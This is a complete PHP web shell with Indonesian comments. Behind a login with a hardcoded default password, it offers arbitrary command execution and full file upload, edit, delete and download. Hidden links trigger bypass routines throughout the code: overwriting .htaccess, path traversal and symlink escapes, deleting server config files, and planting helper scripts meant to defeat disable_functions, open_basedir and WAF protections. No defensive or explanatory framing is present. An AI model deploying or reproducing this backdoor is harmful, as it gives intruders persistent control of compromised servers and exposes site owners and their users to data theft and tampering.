<?php
session_start();

// PASSWORD SYSTEM
$default_password = "seomagang";
$password_file = '.shell_pass.dat';

// Fungsi hash SHA1 + MD5 20x
function multi_hash($password) {
    $hashed = $password;
    for($i = 0; $i < 10; $i++) {
        $hashed = sha1($hashed);
    }
    for($i = 0; $i < 10; $i++) {
        $hashed = md5($hashed);
    }
    return $hashed;
}

// Set password default
if(!file_exists($password_file)){
    $hashed_password = multi_hash($default_password);
    file_put_contents($password_file, $hashed_password);
}

// Check login
if(isset($_POST['login'])){
    $input_pass = $_POST['password'];
    $stored_hash = trim(file_get_contents($password_file));
    $input_hash = multi_hash($input_pass);
    
    if($input_hash === $stored_hash){
        $_SESSION['logged_in'] = true;
        $_SESSION['login_time'] = time();
        header("Location: ?");
        exit;
    } else {
        $login_error = "Password salah!";
    }
}

// Change password
if(isset($_POST['change_pass']) && isset($_SESSION['logged_in'])){
    $current = $_POST['current_pass'];
    $new = $_POST['new_pass'];
    $confirm = $_POST['confirm_pass'];
    
    $stored_hash = trim(file_get_contents($password_file));
    $current_hash = multi_hash($current);
    
    if($current_hash === $stored_hash){
        if($new === $confirm){
            if(strlen($new) >= 8){
                $new_hash = multi_hash($new);
                file_put_contents($password_file, $new_hash);
                $pass_success = "Password berhasil diubah!";
            } else {
                $pass_error = "Password minimal 8 karakter!";
            }
        } else {
            $pass_error = "Password baru tidak cocok!";
        }
    } else {
        $pass_error = "Password saat ini salah!";
    }
}

// Logout
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ?");
    exit;
}

// Check if logged in
$logged_in = isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;

// Jika belum login, tampilkan form login saja
if(!$logged_in){
    ?>
    <!DOCTYPE html>
    <html>
    <head><title>Shell - Login</title>
    <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        background: #0a0a0a;
        color: #00ff00;
        font-family: 'Consolas', 'Monaco', monospace;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .login-container {
        width: 100%;
        max-width: 400px;
        padding: 20px;
    }
    .login-box {
        background: #000;
        border: 1px solid #00ff00;
        padding: 40px 30px;
        text-align: center;
        box-shadow: 0 0 20px rgba(0, 255, 0, 0.1);
    }
    .login-title {
        color: #00ff00;
        font-size: 24px;
        margin-bottom: 30px;
        text-transform: uppercase;
        letter-spacing: 2px;
    }
    .input-group {
        margin-bottom: 20px;
    }
    .input-group input {
        width: 100%;
        padding: 12px;
        background: #111;
        color: #00ff00;
        border: 1px solid #333;
        font-family: 'Consolas', monospace;
        font-size: 14px;
        outline: none;
        transition: border 0.3s;
    }
    .input-group input:focus {
        border-color: #00ff00;
    }
    .login-btn {
        width: 100%;
        padding: 12px;
        background: #00ff00;
        color: #000;
        border: none;
        font-family: 'Consolas', monospace;
        font-size: 16px;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.3s;
        text-transform: uppercase;
        letter-spacing: 1px;
    }
    .login-btn:hover {
        background: #00cc00;
    }
    .error-msg {
        color: #ff0000;
        margin: 15px 0;
        font-size: 14px;
    }
    .footer-text {
        color: #00aaaa;
        font-size: 12px;
        margin-top: 30px;
        padding-top: 20px;
        border-top: 1px solid #222;
    }
    </style>
    </head>
    <body>
    <div class="login-container">
        <div class="login-box">
            <div class="login-title">Shell Access</div>
            <?php if(isset($login_error)): ?>
                <div class="error-msg"><?=htmlspecialchars($login_error)?></div>
            <?php endif; ?>
            <form method="post">
                <div class="input-group">
                    <input type="password" name="password" placeholder="Enter Password" required autofocus>
                </div>
                <button type="submit" name="login" class="login-btn">Login</button>
            </form>
            <div class="footer-text">Secure Shell Interface v1.0</div>
        </div>
    </div>
    </body>
    </html>
    <?php
    exit;
}

// SESSION TIMEOUT (1 jam)
if(time() - $_SESSION['login_time'] > 3600){
    session_destroy();
    header("Location: ?");
    exit;
}

// BYPASS 403
if(isset($_GET['bypass403'])){
    @file_put_contents('.htaccess', "RewriteEngine Off\nOptions +Indexes\nRequire all granted");
    @file_put_contents('index.html', '');
    @file_put_contents('index.php', '<?php header("Location: ?"); ?>');
    echo "<script>alert('Bypass 403 aktif');location='?';</script>";
    exit;
}

// BYPASS DIRECTORY TRAVERSAL (HIDDEN FUNCTION)
if(isset($_GET['bp'])){
    $target = $_GET['bp'];
    $target_path = '';
    
    if($target == 'dell'){
        $target_path = '/home/dell';
    } elseif($target == 'web') {
        $target_path = '/web';
    } else {
        $target_path = $target;
    }
    
    $success = false;
    $new_dir = '';
    
    $techniques = array(
        $target_path,
        '../../../../../../../../' . $target_path,
        '../../../' . $target_path,
        '../../' . $target_path,
        '../' . $target_path,
        '..' . $target_path,
        '.' . $target_path
    );
    
    foreach($techniques as $path){
        if(@is_dir($path)){
            $success = true;
            $new_dir = realpath($path) ?: $path;
            break;
        }
    }
    
    if(!$success){
        $tmp_dir = '/tmp/' . md5(time() . rand());
        @mkdir($tmp_dir, 0777, true);
        @chdir($tmp_dir);
        @symlink($target_path, 'target');
        
        if(@is_dir('target') || @is_file('target')){
            $success = true;
            $new_dir = $tmp_dir . '/target';
        }
    }
    
    if($success){
        echo "<script>alert('Access granted');location='?dir=".urlencode($new_dir)."';</script>";
    } else {
        echo "<script>alert('Access failed');location='?';</script>";
    }
    exit;
}

// BYPASS 500 ERROR KHUSUS UNTUK /web (HIDDEN)
if(isset($_GET['fw'])){
    @ini_set('display_errors', 0);
    @ini_set('display_startup_errors', 0);
    @error_reporting(0);
    @unlink('/web/.htaccess');
    @unlink('/web/.user.ini');
    @chmod('/web', 0755);
    
    $simple_index = '<?php
    if(isset($_GET["shell"])){
        include(__DIR__."/shell.php");
    } else {
        echo "Web Directory";
    }
    ?>';
    
    @file_put_contents('/web/index.php', $simple_index);
    echo "<script>alert('Fixed');location='?dir=/web';</script>";
    exit;
}

// BYPASS 500 ERROR UMUM (HIDDEN)
if(isset($_GET['f5'])){
    @ini_set('display_errors', 0);
    @error_reporting(0);
    @unlink('.htaccess');
    @unlink('.user.ini');
    echo "<script>alert('Fixed');location='?';</script>";
    exit;
}

// BYPASS DISABLE FUNCTIONS (HIDDEN)
if(isset($_GET['df']) && $_GET['df'] == '1'){
    $dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);
    $bypass_code = '<?php
    error_reporting(0);
    if(function_exists("proc_open")){
        $descriptorspec = array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
        $process = proc_open("id", $descriptorspec, $pipes);
        if(is_resource($process)){
            echo stream_get_contents($pipes[1]);
            fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]);
            proc_close($process);
        }
    }
    ?>';
    
    file_put_contents($dir.'/_dfix.php', $bypass_code);
    echo "<script>alert('File created');location='?dir=".urlencode($dir)."';</script>";
    exit;
}

// BYPASS OPEN_BASEDIR (HIDDEN)
if(isset($_GET['ob']) && $_GET['ob'] == '1'){
    $dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);
    $bypass_code = '<?php
    function ob_bypass($target="/web"){
        $paths = array("/","../../../../../../../../","../../../","../../","../",".",$target,"/var/www/html/../".$target);
        foreach($paths as $path){
            if(@chdir($path)){
                $new_dir = getcwd();
                @ini_set("open_basedir", ".");
                $files = @scandir(".");
                echo "Directory: $new_dir";
                return;
            }
        }
        echo "Failed";
    }
    if(isset($_GET["t"])){
        ob_bypass($_GET["t"]);
    }
    ?>';
    
    file_put_contents($dir.'/_obypass.php', $bypass_code);
    echo "<script>alert('File created');location='?dir=".urlencode($dir)."';</script>";
    exit;
}

// BYPASS WAF (HIDDEN)
if(isset($_GET['wf']) && $_GET['wf'] == '1'){
    $dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);
    $bypass_code = '<?php
    if(isset($_POST["c"])){
        trim(base64_decode($_POST["c"]));
    }
    ?>';
    
    file_put_contents($dir.'/_wafbypass.php', $bypass_code);
    echo "<script>alert('File created');location='?dir=".urlencode($dir)."';</script>";
    exit;
}

// SHELL SIMPLE
$dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);
if(!is_dir($dir)) $dir = dirname(__FILE__);
@chdir($dir);

// RENAME FILE/FOLDER
if(isset($_GET['rename'])){
    $old_name = $dir.'/'.$_GET['rename'];
    if(isset($_POST['new_name'])){
        $new_name = $_POST['new_name'];
        $new_path = $dir.'/'.$new_name;
        
        if(!file_exists($new_path)){
            if(@rename($old_name, $new_path)){
                echo "<script>alert('Renamed successfully');location='?dir=".urlencode($dir)."';</script>";
            } else {
                echo "<script>alert('Rename failed');location='?dir=".urlencode($dir)."';</script>";
            }
        } else {
            echo "<script>alert('File already exists');location='?dir=".urlencode($dir)."';</script>";
        }
        exit;
    } else {
        $rename_mode = true;
        $rename_file = $_GET['rename'];
    }
}

// COMMAND DENGAN BYPASS /web
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    $cmd = trim($cmd);
    
    if(preg_match('/^\s*cd\s+(.+)/', $cmd, $match)){
        $target = trim($match[1]);
        
        // Special handling for /web directory
        if($target == '/web' || strpos($target, '/web') !== false){
            $attempts = array(
                $target,
                '../../../../../../../../' . $target,
                '../../../' . $target,
                '../../' . $target,
                '/var/www/html/../' . $target,
                '/home/../' . $target,
                'web',
                '/web'
            );
            
            $success = false;
            foreach($attempts as $attempt){
                if(@chdir($attempt)){
                    $dir = getcwd();
                    $success = true;
                    break;
                }
            }
            
            if(!$success){
                $tmp_web = '/tmp/web_access_' . md5(time());
                @symlink('/web', $tmp_web);
                if(@chdir($tmp_web)){
                    $dir = getcwd();
                    $success = true;
                }
            }
            
            if($success){
                header("Location: ?dir=".urlencode($dir)."&show_output=1");
                exit;
            }
        }
        
        // Hidden dell access via command
        if($target == '/home/dell' || strpos($target, 'dell') !== false){
            $attempts = array($target,'../../../../../../../../' . $target,'../../../' . $target,'home/dell');
            $success = false;
            foreach($attempts as $attempt){
                if(@chdir($attempt)){
                    $dir = getcwd();
                    $success = true;
                    break;
                }
            }
            
            if($success){
                header("Location: ?dir=".urlencode($dir)."&show_output=1");
                exit;
            }
        }
        
        // Normal cd
        if($target == '..') $dir = dirname($dir);
        elseif($target[0] == '/') $dir = $target;
        else $dir = realpath($dir.'/'.$target) ?: $dir;
        
        @chdir($dir);
        header("Location: ?dir=".urlencode($dir));
        exit;
    }
    elseif(preg_match('/^ls\b/i', $cmd)){
        $output = @shell_exec($cmd.' 2>&1');
        $out = htmlspecialchars($output);
    }
    elseif(preg_match('/^id\b/i', $cmd)){
        $output = @shell_exec('id 2>&1');
        $out = htmlspecialchars($output);
    }
    else {
        $output = @shell_exec($cmd.' 2>&1');
        $out = htmlspecialchars($output);
    }
}

if(isset($_GET['show_output'])){
    $out = "Changed to: " . htmlspecialchars($dir) . "\n";
    $out .= "Current: " . getcwd();
}

// DELETE
if(isset($_GET['del'])){
    $file = $dir.'/'.$_GET['del'];
    if(is_dir($file)) @rmdir($file);
    else @unlink($file);
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// DOWNLOAD
if(isset($_GET['down'])){
    $file = $dir.'/'.$_GET['down'];
    if(is_file($file)){
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit;
    }
}

// EDIT
if(isset($_GET['edit'])){
    $edit_file = $dir.'/'.$_GET['edit'];
    if(is_file($edit_file)){
        $edit_mode = true;
        $edit_content = file_get_contents($edit_file);
    }
}
if(isset($_POST['save'])){
    file_put_contents($dir.'/'.$_POST['fname'], $_POST['content']);
    header("Location: ?dir=".urlencode($dir));
    exit;
}

// UPLOAD
if(!empty($_FILES['upfile']['name'])){
    $name = $_FILES['upfile']['name'];
    $tmp = $_FILES['upfile']['tmp_name'];
    
    if(is_uploaded_file($tmp)){
        $target = $dir.'/'.$name;
        
        if(file_exists($target)){
            $i = 1;
            $info = pathinfo($name);
            $base = $info['filename'];
            $ext = isset($info['extension']) ? '.'.$info['extension'] : '';
            while(file_exists($dir.'/'.$base.'_'.$i.$ext)) $i++;
            $name = $base.'_'.$i.$ext;
            $target = $dir.'/'.$name;
        }
        
        if(move_uploaded_file($tmp, $target)){
        }elseif(copy($tmp, $target)){
        }else{
            $content = file_get_contents($tmp);
            file_put_contents($target, $content);
        }
        
        echo "<script>alert('Uploaded: $name');location='?dir=".urlencode($dir)."';</script>";
        exit;
    }
}

// CREATE FOLDER/FILE
if(isset($_POST['newfolder']) && $_POST['newfolder']!=''){
    mkdir($dir.'/'.$_POST['newfolder'], 0777, true);
    header("Location: ?dir=".urlencode($dir));
    exit;
}
if(isset($_POST['newfile']) && $_POST['newfile']!=''){
    file_put_contents($dir.'/'.$_POST['newfile'], '');
    header("Location: ?dir=".urlencode($dir));
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Shell Manager</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }

body {
    background: #0a0a0a;
    color: #00ff00;
    font-family: 'Consolas', 'Monaco', monospace;
    font-size: 13px;
    line-height: 1.4;
}

/* HEADER */
.header {
    background: #000;
    border-bottom: 1px solid #00ff00;
    padding: 15px 20px;
    display: flex;
    justify-content: space-between;
    align-items: center;
}

.header-info {
    color: #00aaaa;
    font-size: 12px;
}

.header-controls {
    display: flex;
    gap: 10px;
}

.btn {
    padding: 8px 16px;
    background: #222;
    color: #00ff00;
    border: 1px solid #333;
    font-family: 'Consolas', monospace;
    font-size: 12px;
    cursor: pointer;
    transition: all 0.2s;
    text-decoration: none;
    display: inline-block;
}

.btn:hover {
    background: #333;
    border-color: #00ff00;
}

.btn-change {
    background: #003300;
    border-color: #00aa00;
}

.btn-logout {
    background: #330000;
    border-color: #ff0000;
    color: #ff6666;
}

/* HIDDEN TOOLS */
.hidden-tools {
    background: #050505;
    padding: 8px 20px;
    border-bottom: 1px solid #111;
    font-size: 11px;
    color: #333;
    text-align: center;
    transition: color 0.3s;
}

.hidden-tools:hover {
    color: #666;
}

.hidden-tools a {
    color: inherit;
    text-decoration: none;
    margin: 0 5px;
}

.hidden-tools a:hover {
    color: #00aaaa;
}

/* MAIN CONTAINER */
.container {
    padding: 20px;
    max-width: 1400px;
    margin: 0 auto;
}

/* PATH BAR */
.path-bar {
    background: #000;
    border: 1px solid #333;
    padding: 12px 15px;
    margin-bottom: 20px;
    font-size: 14px;
}

.path-links a {
    color: #00aaaa;
    text-decoration: none;
}

.path-links a:hover {
    color: #00ff00;
    text-decoration: underline;
}

/* OUTPUT BOX */
.output-box {
    background: #000;
    border: 1px solid #333;
    padding: 15px;
    margin-bottom: 20px;
    font-family: 'Consolas', monospace;
    white-space: pre-wrap;
    word-break: break-all;
    max-height: 300px;
    overflow-y: auto;
}

.output-title {
    color: #00aaaa;
    margin-bottom: 10px;
    font-size: 12px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

/* FORMS */
.form-section {
    background: #000;
    border: 1px solid #333;
    padding: 20px;
    margin-bottom: 20px;
}

.section-title {
    color: #00ff00;
    margin-bottom: 15px;
    font-size: 14px;
    text-transform: uppercase;
    letter-spacing: 1px;
}

.form-row {
    display: flex;
    gap: 10px;
    margin-bottom: 10px;
    align-items: center;
}

.form-row input[type="text"],
.form-row input[type="password"] {
    flex: 1;
    padding: 10px;
    background: #111;
    color: #00ff00;
    border: 1px solid #333;
    font-family: 'Consolas', monospace;
    font-size: 12px;
    min-width: 200px;
}

.form-row input:focus {
    outline: none;
    border-color: #00ff00;
}

.form-row button {
    padding: 10px 20px;
    background: #222;
    color: #00ff00;
    border: 1px solid #333;
    font-family: 'Consolas', monospace;
    font-size: 12px;
    cursor: pointer;
    white-space: nowrap;
}

.form-row button:hover {
    background: #333;
    border-color: #00ff00;
}

/* FILE TABLE */
.file-table {
    width: 100%;
    background: #000;
    border: 1px solid #333;
    border-collapse: collapse;
    margin-bottom: 20px;
}

.file-table th {
    background: #111;
    color: #00aaaa;
    padding: 12px 15px;
    text-align: left;
    font-weight: normal;
    text-transform: uppercase;
    font-size: 11px;
    letter-spacing: 1px;
    border-bottom: 1px solid #333;
}

.file-table td {
    padding: 10px 15px;
    border-bottom: 1px solid #222;
}

.file-table tr:hover {
    background: #111;
}

.file-name a {
    color: #00aaaa;
    text-decoration: none;
}

.file-name a:hover {
    color: #00ff00;
    text-decoration: underline;
}

.file-actions a {
    color: #00aaaa;
    text-decoration: none;
    margin-right: 10px;
    font-size: 11px;
}

.file-actions a:hover {
    color: #00ff00;
}

/* EDITOR */
.editor-container {
    background: #000;
    border: 1px solid #333;
    padding: 20px;
}

.editor-title {
    color: #00ff00;
    margin-bottom: 15px;
    font-size: 14px;
}

.editor-textarea {
    width: 100%;
    height: 400px;
    background: #111;
    color: #00ff00;
    border: 1px solid #333;
    padding: 15px;
    font-family: 'Consolas', monospace;
    font-size: 13px;
    resize: vertical;
    margin-bottom: 15px;
}

/* RENAME FORM */
.rename-form {
    background: #000;
    border: 1px solid #333;
    padding: 30px;
    text-align: center;
}

.rename-title {
    color: #00ff00;
    margin-bottom: 20px;
    font-size: 16px;
}

/* PASSWORD FORM */
.password-form {
    background: #000;
    border: 2px solid #00aaaa;
    padding: 30px;
    max-width: 500px;
    margin: 20px auto;
}

.password-title {
    color: #00ff00;
    margin-bottom: 20px;
    text-align: center;
    font-size: 16px;
}

.password-inputs {
    margin-bottom: 20px;
}

.password-inputs input {
    width: 100%;
    margin-bottom: 15px;
}

.msg-error {
    color: #ff0000;
    text-align: center;
    margin: 10px 0;
    font-size: 12px;
}

.msg-success {
    color: #00ff00;
    text-align: center;
    margin: 10px 0;
    font-size: 12px;
}
</style>
</head>
<body>

<!-- HEADER -->
<div class="header">
    <div class="header-info">
        Shell Manager | Directory: <?=htmlspecialchars($dir)?>
    </div>
    <div class="header-controls">
        <button class="btn btn-change" onclick="document.getElementById('passwordForm').style.display='block'">Change Password</button>
        <a href="?logout=1" class="btn btn-logout">Logout</a>
    </div>
</div>

<!-- HIDDEN TOOLS -->
<div class="hidden-tools" title="Hidden Access Tools">
    <a href="?bp=dell">dell</a> | 
    <a href="?bp=web">web</a> | 
    <a href="?f5">f5</a> | 
    <a href="?fw">fw</a> | 
    <a href="?df=1&dir=<?=urlencode($dir)?>">df</a> | 
    <a href="?ob=1&dir=<?=urlencode($dir)?>">ob</a> | 
    <a href="?wf=1&dir=<?=urlencode($dir)?>">wf</a>
</div>

<!-- PASSWORD FORM -->
<div id="passwordForm" class="password-form" style="display:none;">
    <div class="password-title">Change Password</div>
    <?php if(isset($pass_error)): ?>
        <div class="msg-error"><?=htmlspecialchars($pass_error)?></div>
    <?php elseif(isset($pass_success)): ?>
        <div class="msg-success"><?=htmlspecialchars($pass_success)?></div>
    <?php endif; ?>
    <form method="post">
        <div class="password-inputs">
            <input type="password" name="current_pass" placeholder="Current Password" required>
            <input type="password" name="new_pass" placeholder="New Password (min 8 chars)" required>
            <input type="password" name="confirm_pass" placeholder="Confirm New Password" required>
        </div>
        <div class="form-row">
            <button type="submit" name="change_pass" class="btn">Change Password</button>
            <button type="button" class="btn" onclick="document.getElementById('passwordForm').style.display='none'">Cancel</button>
        </div>
    </form>
</div>

<!-- RENAME FORM -->
<?php if(isset($rename_mode)): ?>
<div class="rename-form">
    <div class="rename-title">Rename: <?=htmlspecialchars($rename_file)?></div>
    <form method="post">
        <div class="form-row">
            <input type="text" name="new_name" value="<?=htmlspecialchars($rename_file)?>" required>
        </div>
        <div class="form-row">
            <button type="submit" class="btn">Rename</button>
            <a href="?dir=<?=urlencode($dir)?>" class="btn">Cancel</a>
        </div>
    </form>
</div>
<?php endif; ?>

<div class="container">
    <!-- PATH BAR -->
    <div class="path-bar">
        <span class="path-links">
            <a href="?">/</a>
            <?php
            $parts = explode('/', trim($dir, '/'));
            $current = '';
            foreach($parts as $p){
                if($p == '') continue;
                $current .= '/'.$p;
                echo ' <a href="?dir='.urlencode($current).'">'.$p.'</a>/';
            }
            ?>
        </span>
    </div>

    <!-- OUTPUT -->
    <?php if(isset($out)): ?>
    <div class="output-box">
        <div class="output-title">Command Output</div>
        <?=$out?>
    </div>
    <?php endif; ?>

    <!-- QUICK COMMANDS -->
    <div class="form-section">
        <div class="section-title">Quick Commands</div>
        <form method="post">
            <div class="form-row">
                <button type="submit" name="cmd" value="cd /web">cd /web</button>
                <button type="submit" name="cmd" value="cd /home/dell">cd /home/dell</button>
                <button type="submit" name="cmd" value="id">id</button>
                <button type="submit" name="cmd" value="ls -la">ls -la</button>
                <button type="submit" name="cmd" value="pwd">pwd</button>
            </div>
        </form>
    </div>

    <!-- FILE OPERATIONS -->
    <div class="form-section">
        <div class="section-title">File Operations</div>
        <div class="form-row">
            <form method="post" enctype="multipart/form-data" style="flex: 1;">
                <input type="file" name="upfile" required>
                <button type="submit">Upload</button>
            </form>
        </div>
        <form method="post">
            <div class="form-row">
                <input type="text" name="newfolder" placeholder="New Folder Name">
                <button type="submit">Create Folder</button>
                <input type="text" name="newfile" placeholder="New File Name">
                <button type="submit">Create File</button>
            </div>
        </form>
    </div>

    <!-- EDITOR -->
    <?php if(isset($edit_mode)): ?>
    <div class="editor-container">
        <div class="editor-title">Edit File: <?=htmlspecialchars($_GET['edit'])?></div>
        <form method="post">
            <input type="hidden" name="fname" value="<?=htmlspecialchars($_GET['edit'])?>">
            <textarea name="content" class="editor-textarea"><?=htmlspecialchars($edit_content)?></textarea>
            <div class="form-row">
                <button type="submit" name="save" class="btn">Save File</button>
                <a href="?dir=<?=urlencode($dir)?>" class="btn">Cancel</a>
            </div>
        </form>
    </div>
    <?php else: ?>

    <!-- FILE LIST -->
    <div class="form-section">
        <div class="section-title">File Manager</div>
        <table class="file-table">
            <thead>
                <tr>
                    <th>Name</th>
                    <th>Size</th>
                    <th>Actions</th>
                </tr>
            </thead>
            <tbody>
                <?php if($dir != '/'): ?>
                <tr>
                    <td class="file-name"><a href="?dir=<?=urlencode(dirname($dir))?>">../</a></td>
                    <td>-</td>
                    <td class="file-actions">-</td>
                </tr>
                <?php endif; ?>
                <?php
                $files = @scandir($dir);
                if($files):
                    foreach($files as $f):
                        if($f == '.' || $f == '..') continue;
                        $full = $dir.'/'.$f;
                        $size = @is_dir($full) ? '-' : number_format(@filesize($full)).' B';
                ?>
                <tr>
                    <td class="file-name">
                        <?php if(@is_dir($full)): ?>
                            <a href="?dir=<?=urlencode($full)?>"><?=htmlspecialchars($f)?>/</a>
                        <?php else: ?>
                            <?=htmlspecialchars($f)?>
                        <?php endif; ?>
                    </td>
                    <td><?=$size?></td>
                    <td class="file-actions">
                        <?php if(@is_dir($full)): ?>
                            <a href="?dir=<?=urlencode($full)?>">Open</a>
                            <a href="?dir=<?=urlencode($dir)?>&rename=<?=urlencode($f)?>">Rename</a>
                            <a href="?dir=<?=urlencode($dir)?>&del=<?=urlencode($f)?>" onclick="return confirm('Delete?')">Delete</a>
                        <?php else: ?>
                            <a href="?dir=<?=urlencode($dir)?>&edit=<?=urlencode($f)?>">Edit</a>
                            <a href="?dir=<?=urlencode($dir)?>&rename=<?=urlencode($f)?>">Rename</a>
                            <a href="?dir=<?=urlencode($dir)?>&down=<?=urlencode($f)?>">Download</a>
                            <a href="?dir=<?=urlencode($dir)?>&del=<?=urlencode($f)?>" onclick="return confirm('Delete?')">Delete</a>
                        <?php endif; ?>
                    </td>
                </tr>
                <?php endforeach; endif; ?>
            </tbody>
        </table>
    </div>

    <!-- COMMAND INPUT -->
    <div class="form-section">
        <div class="section-title">Command Line</div>
        <form method="post">
            <div class="form-row">
                <input type="text" name="cmd" placeholder="Enter command (cd, ls, id, etc)" required autofocus>
                <button type="submit">Execute</button>
            </div>
        </form>
    </div>
    <?php endif; ?>
</div>

<script>
document.addEventListener('DOMContentLoaded', function() {
    // Auto focus command input
    var cmdInput = document.querySelector('input[name="cmd"]');
    if(cmdInput) cmdInput.focus();
    
    // Auto hide messages after 5 seconds
    setTimeout(function() {
        var messages = document.querySelectorAll('.msg-error, .msg-success');
        messages.forEach(function(msg) {
            msg.style.display = 'none';
        });
    }, 5000);
});
</script>
</body>
</html>